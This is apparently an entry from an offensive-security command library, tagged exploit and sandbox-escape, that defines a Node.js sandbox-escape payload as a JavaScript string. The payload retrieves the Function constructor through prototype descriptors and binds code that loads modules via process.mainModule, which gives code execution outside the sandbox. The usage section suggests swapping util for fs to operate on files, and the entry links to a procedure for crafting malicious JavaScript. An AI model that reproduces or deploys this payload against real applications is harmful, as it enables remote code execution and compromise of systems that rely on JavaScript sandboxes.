---
id: g7h8i9j0-k1l2-3456-ghij-789012345678
name: define-malicious-code-nodejs
type: command
executor: javascript
data: >-
  var code = "function fn() {};var constructorProperty =
  Object.getOwnPropertyDescriptors(fn.__proto__.constructor);var properties =
  Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();var
  Func = properties.map(function (x) {return x.bind(x, 'return
  this.process.mainModule.constructor._load(`util`).log(`pwned`)')}).pop();(Func())()";
output: String containing the payload
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:24.351Z'
platforms:
  - Node.js
tags:
  - exploit
  - sandbox-escape
verified: false
validated: true
submitted: true
---

# define-malicious-code-nodejs

## Command

```javascript
var code = "function fn() {};var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__.constructor);var properties = Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();var Func = properties.map(function (x) {return x.bind(x, 'return this.process.mainModule.constructor._load(`util`).log(`pwned`)')}).pop();(Func())()";
```

## Description

Defines a JavaScript string variable with the sandbox escape payload for Node.js RCE, using prototype manipulation to bind and execute code loading the util module.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| code | Multi-line string with prototype manipulation and Function binding | Yes |

## Examples

### Basic Usage

```javascript
var code = "...payload...";
```

### Advanced Usage

Adapt the inner string for different modules, e.g., replace util with fs for file ops.

## Expected Output

A string variable assigned, inspectable via console.log(code) to verify content.

## Related

- [[commands/console-log-safeeval]]
- [[procedures/Craft-Malicious-JavaScript-for-Sandbox-Escape]]
